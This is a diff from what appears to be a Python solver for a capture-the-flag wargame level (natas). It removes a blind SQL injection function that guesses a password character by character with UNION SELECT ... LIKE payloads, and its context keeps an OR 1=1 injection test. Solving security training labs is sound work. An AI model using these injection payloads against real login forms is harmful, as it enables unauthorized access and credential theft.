@@ -68,24 +68,6 @@ def obtain_password(username,password,session,url,user_in_db):
         contador+=1
     print(f"the password is {newpassword}")
 
-def obtain_password2(username,password,session,url):
-    characters = 'qwertyuiopñlkjhgfdsazxcvbnm1234567890QWERTYUIOPÑLKJHGFDSAZXCVBNM*?!#$&/()='
-    contador = 0
-    newpassword = 'hP' #inicio h---[R P], 6 ,H
-    l=[]
-    while True:
-        if contador == len(characters)-1:
-            break
-        print(f"trying with {newpassword}{characters[contador]}")
-        test = newpassword+ characters[contador]
-        payload = {'username': "\" UNION SELECT * FROM users WHERE BINARY password LIKE \""+test+"%\" AND username = \"natas16" }
-        r= session.post(url,auth=(username, password),data=payload)
-        if b"This user exist" in r.content:
-            print(f"encontramos con {characters[contador]}")
-            l.append(characters[contador])
-        contador+=1
-    print(f"la password es {l}")
-
 #Function to see if we can inject code
 def test_code_injection():
     payload = {'debug':'True','username': "\" OR \"1=1" }
